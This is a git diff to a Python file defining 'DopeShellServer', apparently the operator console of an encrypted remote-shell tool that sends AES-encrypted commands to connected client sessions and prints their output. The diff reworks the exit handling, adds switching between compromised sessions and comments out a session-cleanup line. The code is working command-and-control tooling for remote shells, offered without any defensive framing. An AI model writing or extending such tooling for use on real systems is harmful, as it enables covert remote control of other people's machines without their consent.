@@ -10,6 +10,7 @@ import platform
 import argparse
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
+import sys
 
 class DopeShellServer:
     def __init__(self, host, port, key):
@@ -68,9 +69,7 @@ class DopeShellServer:
         decryptor = cipher.decryptor()
         decrypted_data = decryptor.update(data[16:]) + decryptor.finalize()
         return decrypted_data
-    def exit(command):
-        client_socket.send(self.encrypt(command.encode('utf-8')))
-            break
+
 
 
     def handle_client(self, session_id, client_socket):
@@ -80,9 +79,24 @@ class DopeShellServer:
             command = input(f"Session {session_id} Shell> ")
             
             if command.lower() == 'exit':
-                exit(command)
+                print('calling exit function!')
+                client_socket.send(self.encrypt(command.encode('utf-8')))
+                response = self.receive_data(client_socket)
+                print(response.decode('utf-8'))
+                del self.sessions[session_id]  # Remove session on exit
+                while True:
+                    self.list_sessions()
+                    new_session_id = int(input("Enter session number or -1 to exit: "))
+                    if new_session_id in self.sessions:
+                        self.active_session = int(new_session_id)
+                        print(f"[+] Switched to session {new_session_id}")
+                        break
+                    elif new_session_id == -1:
+                        sys.exit() 
+                    else:
+                        print(f"[-] Session {new_session_id} does not exist.")
 
-            if command.lower().startswith('help'):
+            elif command.lower().startswith('help'):
                 parts = command.split(maxsplit=1)
                 if len(parts) > 1:
                     specific_command = parts[1].lower()
@@ -142,7 +156,7 @@ class DopeShellServer:
                 print(response.decode('utf-8'))
 
         client_socket.close()
-        del self.sessions[session_id]  # Remove session on exit
+        # del self.sessions[session_id]  # Remove session on exit
         if not self.sessions:
             self.active_session = None  # Reset active session if no sessions remain
 
